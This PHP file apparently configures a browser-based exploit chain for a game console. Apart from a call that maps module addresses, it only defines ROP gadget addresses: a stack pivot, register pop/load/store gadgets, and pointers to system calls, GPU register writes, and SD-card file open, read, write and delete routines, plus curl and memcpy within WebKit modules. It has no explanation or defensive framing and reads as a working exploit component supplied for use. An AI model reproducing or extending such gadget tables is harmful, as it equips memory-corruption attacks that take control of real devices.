<?php

$CODEBLK_ENDADR = ((0x00100000 + 0x00270000 + 0x00064000 + 0x00017EA0 + 0x00056830) + 0xfff) & ~0xfff;
$OSSCRO_HEAPADR = 0x083a5000;
$WEBKITCRO_HEAPADR = 0x085a7000;
$APPHEAP_PHYSADDR = 0x25000000;
init_mapaddrs_cro();

$STACKPIVOT_ADR = 0x00131080;
$COND_THROWFATALERR = 0x001a0420;

$ROP_POP_R0R6PC = 0x00105128;
$ROP_POP_R0R8PC = 0x00131cec;
$ROP_POP_R0PC = 0x0010c460;
$ROP_POP_R1R5PC = 0x00101e8c;

$ROP_STR_R1TOR0 = 0x001040bc;
$ROP_LDR_R0FROMR0 = 0x001117cc;
$ROP_ADDR0_TO_R1 = 0x0012c2f8;

$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00169c18;

$srv_GetServiceHandle = 0x0023caf8;

$svcGetProcessId = 0x00100ca4;
$svcSendSyncRequest = 0x00244998;
$svcControlMemory = 0x001447f0;
$svcSleepThread = 0x001041f4;

$GXLOW_CMD4 = 0x0011de60;
$GSPGPU_SERVHANDLEADR = 0x003dd72c;

$FS_MOUNTSDMC = 0x0019dcdc;

$IFile_Open = 0x00230230;
$IFile_GetSize = 0x002077bc;
$IFile_Seek = 0x00152840;
$IFile_Read = 0x00169aac;

$FS_DELETEFILE = 0x00169790;

$FSFILEIPC_CLOSE = 0x00280b44;
$FSFILEIPC_READ = 0x00280aec;
$FSFILEIPC_GETSIZE = 0x00280bd0;

$POPPC = 0x001057c0;

$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x0002ffb0;

$WKC_FOPEN = $OSSCRO_MAPADR+0x5d8-0x4;
$WKC_FCLOSE = $OSSCRO_MAPADR+0x5d0-0x4;
$WKC_FREAD = $OSSCRO_MAPADR+0x5e0-0x4;
$WKC_FWRITE = $OSSCRO_MAPADR+0x5e8-0x4;
$WKC_FSEEK = $OSSCRO_MAPADR+0x5f8-0x4;

$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xe9c-0x4;
$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea4-0x4;
$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xecc-0x4;
$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa2c-0x4;

$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x194-0x4;
$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x30c-0x4;

$ROP_snprintf = $OSSCRO_MAPADR+0x3c0-0x4;

$GSP_FLUSHDCACHE = 0x00192794;
$GSP_WRITEHWREGS = 0x0011e268;

$IFile_Close = 0x001fddd8;
$IFile_Write = 0x00169b34;

$OPENFILEDIRECTLY_WRAP = 0x0027d4e4;

$THROW_FATALERR = 0x00152de8;

$ROP_POP_R0IPPC = 0x0018de04;

$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;

$ROP_LDMSTM_R5R4_R0R3 = 0x001d3b08;

$ROP_STMR0_R0PC = 0x001bc8c0;

$ROP_LDRR0R4_LDRR0_R0OFF4_LDRR0_R0OFF34_OBJVTABLECALL_5C_POPR4LR = $WEBKITCRO_MAPADR+0x003741e8;

?>